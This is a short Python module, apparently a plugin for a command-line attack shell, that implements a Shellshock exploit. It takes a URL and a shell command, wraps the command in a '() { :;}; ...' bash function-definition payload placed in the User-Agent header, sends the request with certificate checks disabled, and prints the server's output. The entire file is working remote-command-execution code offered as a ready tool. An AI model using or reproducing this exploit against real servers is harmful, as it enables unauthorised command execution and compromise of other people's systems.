from ..commands import Command
import requests


def process_lines(url, command):
    # Construct the Shellshock payload
    shellshock_payload = f"() {{ :;}}; echo Content-Type: text/html; echo; {command[1:-1]};"

    # Set up headers with the malicious payload
    headers = {
        "User-Agent": shellshock_payload
    }

    try:
        # Send the HTTP GET request with the payload
        response = requests.get(url, headers=headers, verify=False)

        # Print the server's response
        print("Data received from server -->\n", response.text)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")


class ShellShocker(Command):
    """Send data over HTTP using requests"""

    def do_command(self, lines: str, *args):
        args = lines.split(" ", 1)
        if len(args) != 2:
            print("Usage: <URL> <Command>")
            return

        process_lines(args[0], args[1])


command = ShellShocker